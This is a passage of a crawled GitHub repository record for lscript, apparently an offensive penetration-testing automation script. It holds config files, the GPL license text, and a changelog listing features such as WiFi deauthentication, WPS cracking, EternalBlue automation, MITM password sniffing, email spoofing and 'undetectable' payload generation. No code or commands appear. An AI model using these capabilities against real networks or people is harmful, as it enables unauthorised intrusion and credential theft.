{
  "metadata": {
    "timestamp": 1736568205380,
    "page": 50,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjUw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "arismelachroinos/lscript",
      "stars": 4094,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitattributes",
          "type": "blob",
          "size": 0.369140625,
          "content": "# Auto detect text files and perform LF normalization\n* text=auto\n\n# Custom for Visual Studio\n*.cs     diff=csharp\n\n# Standard to msysgit\n*.doc\t diff=astextplain\n*.DOC\t diff=astextplain\n*.docx diff=astextplain\n*.DOCX diff=astextplain\n*.dot  diff=astextplain\n*.DOT  diff=astextplain\n*.pdf  diff=astextplain\n*.PDF\t diff=astextplain\n*.rtf\t diff=astextplain\n*.RTF\t diff=astextplain\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.6337890625,
          "content": "# Windows image file caches\nThumbs.db\nehthumbs.db\n\n# Folder config file\nDesktop.ini\n\n# Recycle Bin used on file shares\n$RECYCLE.BIN/\n\n# Windows Installer files\n*.cab\n*.msi\n*.msm\n*.msp\n\n# Windows shortcuts\n*.lnk\n\n# =========================\n# Operating System Files\n# =========================\n\n# OSX\n# =========================\n\n.DS_Store\n.AppleDouble\n.LSOverride\n\n# Thumbnails\n._*\n\n# Files that might appear in the root of a volume\n.DocumentRevisions-V100\n.fseventsd\n.Spotlight-V100\n.TemporaryItems\n.Trashes\n.VolumeIcon.icns\n\n# Directories potentially created on remote AFP share\n.AppleDB\n.AppleDesktop\nNetwork Trash Folder\nTemporary Items\n.apdisk\n"
        },
        {
          "name": "Changelog",
          "type": "blob",
          "size": 13.818359375,
          "content": "2.1.5\nRemade installation menu, now you can select multiple tools at once.\nFixed no output when handshake scanning.\nFixed wifiphisher launch when only 1 interface available.\nAdded option to select the entire network as target at auto-exploit browser menu.\nAngry IP updated.\nFixed routersploit installation.\nAdded new wififb menu that auto-saves captured credentials, triggered only via ks.\nAdded new error for auto-fix, when pyrit handshake verification always is bad.\nAuto exiting deauth attack when specified num of deauths completed.\nOption to not ask for confirmation to remove and reinstall already installed tools.\nImproved \"local IPs and gateways\" feature.\nAdded option to autocheck for handshake every x seconds.\nAdded option to copy captured handshake to desktop after validating.\nGo to gateway's IP in browser by typing 'gate'.\nAdded Yuki Chan to website tools.\nFixed install.sh error in gnome-terminal command.\nFixed airodump's \\x00\\x00\\x00 bug on output when scanning. \nAdded default wififb names.\nFixed fluxion's installation.\nAdded option to test arp-scan IPs with eternalblue exploit.\nFixed unlock WPS menu errors.\nFixed Fluxion launch error due to latest fluxion version.\nFixed Kwetza installation typo.\nFixed many bugs, but not even half.\n\n\n2.1.4\nNew WPS feature added: Pixie loop till pin found.\nNew WPS feature added: Unlock WPS for APs with locked WPS.(beta)\nNew feature: Bruteforce router's login password.\nRemade old WEP menu.\nAdded option to re arp-scan network.\nAdded option to show bandwidth via iftop tool.\nFixed wash output if network has space in it.\nImproved geolocation feature.\nFixed arp-scan error.\nFixed major issue on handshake scan, sometimes APs disappearing.\nFixed minor error in errors menu.\nAdded description to information gathering tools.\nImproved descriptions on wifi tools.\nAdded two options to validate handshake.\nAdded netool-toolkit to wifi tools.\nAdded website tools menu.\nAdded Leviathan to website tools.\nAdded VMR and Airgeddon to WPS menu.\nAdded SQLmap automated script to website tools and banner.\nAdded setting to change the interface for arp-scan feature.\nAdded checking if interface available before scan.\nAdded patator to other tools.\nAdded Evil-Droid to remote access tools and keyboard shortcuts.\nImproved pixie dust loop attack.\nAdded NoSQLMap to website tools and keyboard shortcuts.\nAdded option in settings to change iftop's interface.\nAdd e.g. to LHOST on eternalblue.\n\n\n\n2.1.3\nAdded Geolocate IP feature.\nAdded fully automatic beef + mitmf browser injection.\nAdded automated local IPs & gateways print feature.\nAdded Beef to remote access tools and keyboard shortcuts.\nAdded option to verify the handshake with pyrit too from deauth menu.\nAdded option to deauth all, wait and loop.\nAdded ngrok installation option from main menu.\nFixed error when going back from creating a keyboard shortcut.\nFixed angry ip scanner keyboard shortcut.\nChanged to new gnome-terminal command.\nAdded delay option to WPS bruteforce and fixed errors.\nAdded red color when WPS is locked on an AP.\nAdded error message when selecting a WPS-locked AP.\nAdded setting to enable --ingore-negative-one in deauthing.\nAdded option to manually type a MAC to deauth.\nAdded return when starting/stopping services.\nAdded choosing if you want to keep a bad handshake.\nAdded cowpatty handshake check on deauth.\nAdded setting to specify another MAC address for when starting monitor.\nAdded samples to banner's changing color option in settings.\n\n\n\n2.1.1\nFixed interfaces not saved after update.\nFixed Terms of use not saved after update.\nAdded delay after cupp wordlist generation.\nFixed tool's installation in WPS menu.\nAdded Gloom-Framework to wifi tools and keyboard shortcuts.\nCheck handshake name if already exists.\nAdded handshake check option in deauth menu.\t\nAdded automated install of nWatch requirements due to error reports.\nAdded Arcanus to wifi tools and keyboard shortcuts.\nAdded automated MSFPC script to remote access tools.\nAdded automated morphHTA script to remote access tools.\nAdded LFISuite to remote access tools and keyboard shortcuts.\nAdded automated UniByAv script to remote access.\nAdded automated demiguise script to remote access.\nAdded DKMC to remote access tools and keyboard shortcuts.\nAdded SecHub to wifi tools and keyboard shortcuts.\nAdded color to pyrit handshake validation output.\n\n\n\n2.1.0\nFixed error in deauth when selecting a non existing station number.\nFixed error when checking if monitor enabled.\nAdded support for ALFA AWUS036ACH when checking if monitor enabled.\nAdded Koadic tool to remote access and keyboard shortcuts.\nAdded Empire tool to remote access and keyboard shortcuts.\nAdded Meterpreter_Paranoid_Mode tool to remote access and keyboard shortcuts.\nAdded Dr0p1t-Framework tool.\nAdded Dr0p1t-Framework automation script to remote access.\nAdded Wifi-Pumpkin in wifi tools and keyboard shortcuts.\nAdded Veil in remote access tools and keyboard shortcuts.\nAdded Leviathan in remote access tools and keyboard shortcuts.\nAdded FakeImageExploiter to remote access tools.\nAdded Avet to remote access tools.\nAdded complete fix for apache2 failed to start error.\nAdded latest changelog view at every update.\nFixed no shortcuts saving after update error.\nFixed settings not saved after update.\n\n\n\n2.0.9\nFixed error in handshake menu line 59.\nAdded Findsploit to metasploit menu.\nFixed minor mistakes with handshake menu.\nHandshake deauth improved.\nAdded auto-sorting of connected clients in deauth.\nAdded option to select which client to disconnect.\nAdded blue color for WEP ap's on handshake menu.\nAdded option to check multiple hosts for eternalblue.\nFixed minor issue with ngrok.\nFixed 'Found -6 clients error' in deauth.\nFixed 'No networks found' after unsuccessful capture.\nAdded Howdoi tool in banner.\nAdded automated Howdoi settings in settings menu.\nAdded operative-framework to information gathering tools.\nImproved AP select in handshake menu(-le -ge).\nAdded support for ALFA AWUS036ACH wireless USB adapter.\nAdded netattack2 to wifi tools.\nAdded operative-framework and netattack2 to keyboard shortcuts.\n\n\n\n2.0.8\nRemoved delay from donation menu to main menu.\nAdded option to change logo color in settings.\nFixed typo in keyboard shortcuts.\nAdded delay in info tools.\nFixed error in keyboard shortcuts line 4028.\nFixed error file not found in handshake menu.\nFixed error when launching cupp.\nAdded bleachbit to other tools + to installation menu.\nAdded VMR MDK in wifi tools + to installation menu.\n\n\n\n2.0.7\nImproved start/stop options.\n+Added color to 'Done'.\n+Removed delay if everything is ok.\nAdded nessus start/stop (if you have it already installed).\nAdded new fix to errors menu.\nFixed huge error with new installation method.\n\n\n\n2.0.6\nAdded Kwetza (payload to apk) to remote access tools.\nAdded Kwetza automated script.\nFixed small error when cleaning handshake.\nRemoved boopsuite from install/reinstall.\nFixed/improved code in WPS cracking menu.\nFixed delay when going back from ngrok to main menu.\nFixed install.sh error.\nMoved the installation of all tools into functions.\nAdded option to install every tool when being launched but not installed already.\nAdded settings menu for future features.\nImproved all 'if' statements.\nChanged all 'back)' options with 'b)'.\nAdded indication if tools in WPS menu are not installed.\n\n\n\n2.0.5\nAdded option to clean the handshake after being verified.\nAutomation script for bully.\nCheck if bully is installed.\nCheck if wifiautopwner is installed.\nImproved code.\nAdded error message when no networks found in wash/airodump scan.\nAdded ngrok to downloads.\nAdded ngrok automation.\nAdded automated payload genaration for Shellter intergration.\n\n\n\n2.0.4\nCupp moved to other tools.\nAdded delay to wifi tools.\nFixed eternal scanner not installed error.\nAdded donation option.\nAdded shellter to keyboard shortcuts.\n\n\n\n2.0.3\nAdded Dagon automation script to other tools.\nAdded LALIN to other tools.\nAdded LALIN to keyboard shortcuts.\nAdded error when trying to change interface that is not available.\nAdded knockmail to infoga tools.\n\n\n\n2.0.2\nImproved change mac feature.\nAdded red color to wirelessinterface if not available.\nAdded warning to installing u/i.\nAdded Eaphammer tool to install/reinstall.\nAdded new fix in errors.\nAdded Eaphammer automation script.\nAdded services toggle shortcuts in ks) 2).\nFixed wifiphisher installation.\nAdded a backup way to seatch for public ip if one fails.\nAdded close terminal when typing exit.\n\n\n2.0.1\nImproved layout of install/reinstall tool menu.\nAdded Infoga to information gathering tools.\nPublic ip error report added.\nFixed anonym8 disabling error.\nFixed last options error in deauth menu.\nAdded nWatch to wifi tools and to keyboard shortcuts.\nAdded LICENSE file.\nAdded Eternal scanner to wifi tools and to keyboard shortcuts.\n\n\n2.0.0\nWinpayloads added to Remote access tools - Generate undetectable payloads.\nAdded ability to choose another AP without having to scan again in handshake menu.\nImproved deauth feature in handshake menu.\nAdded new deauth option,when capturing on a file.Deauth every client seperately.\nAdded shellter tool in remote access menu.\nAdded 1 more fix in errors menu.\nFixed error in metasploit - payload name.\nAdded support for all payloads in msfvenom automation.\nImproved listeners feature in metasploit menu.\nAdded CHAOS to keyboard shortcuts.\nAdded routersploit to wifi tools and to keyboard shortcuts.\n\n\n1.9.9\nAdded information gathering menu in tools.\nImproved code\nAdded ReconDog in information gathering tools menu\nAdded RED HAWK in information gathering tools menu\nAdded Sniper in information gathering tools menu\nFixed anonym8 not installed error\nFixed error in code on install/reinstall tools manu\nAdded ReconDog to shortcuts\nAdded RED HAWK to shortcuts\nRemoved auto installation of all tools in installed\n\n1.9.8\nImproved handshake feature\nAdded echoing the handshake directory\nAdded an error fix in errors menu\nImproved code in main menu\nFixed layout in main manu when interface names are different\n\n\n1.9.7.1\nFixed tiny error when launching script\n\n1.9.7\nAdded open networks in handshake menu\nImproved tools menu\n\n1.9.6\nAdded Handshake clean option\nImproved WPS PIN cracking code\nImproved Handshake feature\n\n\n1.9.5\nAdded handshake automation like fluxion.No more copy-paste mac and channel\nAdded more functions,code easier to read.\nEternalblue added '0' target\nAdded eternalblue checking in hidden shortcuts\n\n\n1.9.4\nAdded two way handshake validation\nCustom shortcuts now will not be deleted when updating\nFixed typos etc\n\n\n1.9.3.2\nSpoofed email fixes and additions\nAdded changelog to hidden shortcuts\n\n\n1.9.3.1\nquick installer fix\n\n\n1.9.3\nChanged script's layout\nAdded better locating on installer when a tools is already installed\nAdded Spoof EMAIL feature\nAdded more functions to code.Easier to read. 32 functions\nMore changes to code \n\n\n1.9.2\nAdded more functions to code.Easier to read.\nReplaced 4nonimizer with anonym8\nAdded option to create a listener when creating a payload\nAdded encoder to metasploit payload creation\nAdded msfconsole launcher and msfupdate to metasploit menu\nAdded hidden shortcuts feature\nAdded eternalblue exploit automation in hidden features\nAdded Angry IP Scanner to wifi tools\nOption to autostart monitor mode when not already and needed\nScan for networks on spesific channel option\n\n\n1.9.1\nImproved code when going back on navigation manus\nAdded support for all wireless interface names\nAdded many functions and improved code\nAdded hidden shortcuts menu\n\n\n1.9\nAdded option to install/reinstall a tool within lscript\nHuge code change on the installer, now lscript installs first, then the tools,only if you want\nAdded openvas to Tools, NOT installed by default\nAdded TheFatRat to Remote access\nImproved code on keyboard shortcuts\nAdded Metasploit listener creation and saving.Metasploit automation.\n\n\n\n1.8\nMassive update to installer(updates now are installed x100 faster)\n\"7) View your Public IP\" option now loads a lot faster\nAdded \"back\" option to menus for easier navigation\nAdded custom keyboard shortcuts option\nAdded handshake validation\nAdded site clonning + dnsspoofing in MITM scripts\nAdded bully wps tool\nAdded WiFi autopwner toolT\nAdded Zirikatu payload generator\nAdded view changelog option\nAdded metasploit payload creation automation\nLatest fluxion added\nImproved code in menus(added while loops)\nImproved code, many functions added\nImproved code, more default variables for easy and fast changes\n\n1.7\nAdded mdk3 deauth method\nRemoved mac changing of eth0 when typing \"start\"\nAdded deauth option even for no file capture\nFluxion updated!\nAdded websploit wifi tool\nAdded new fix in \"errors\"\nAdded Pupy to remote access\n\n1.6\nFixed BeeLogger install error\nAdded sslstrip2\nAdded dns2proxy\nAdded MITM password sniffing automation\nReplaced anonym8 with anonsurf\nReplaced torghost with 4nonimizer\n\n\n1.5\norganised some code\nfixed random bugs\nfixed mistake when selecting xerxes dos tool\nchecking if monitor mode enabled on options 10 11 12\nchecking if monitor mode disabled on option 7\n\n\n\n1.4\nFixed typos\nUpdated installer \nAdded xterm bottom right position when deauthing on handshake capture\nAdded pixie dust WPS pin cracking\nChanged WPS pin cracking code\nImproved position of new gnome-terminals on handshake and WPS pin finding features\nImproved update feature , testing connection before updating\n\n\n1.3\nFixed colors on interface selection\nAdded \"Main menu\" and \"Exit\" on interface selection\nAdded option to not create a file on handshake capture\nAdded .csv and .netxml file cleanup on handshake capture\nFixed typo on install.sh\n\n1.2\nremoved shARP as it has problems\nadded Xerxes DoS tool\nadded ezsploit tool on remote access\nadded ezsploit to installer\nadded Katana framework on wifi tools\nadded Katana framework on installer\nadded wifiphisher compatibility if you only have one wlan inteface\nadded airgeddon to wifi tools\nadded airgeddon to installer\n\n0.3\nadded wifite to WEP hacking\nadded shARP network defender on Tools\nadded shARP installation to install.sh\nadded mdk3-master to Tools\nadded mdk3-master to install.sh\nadded wash error on error-fixing (type \"errors\")\n\n0.2\nAdded ghost phisher tool\n"
        },
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 34.3251953125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A 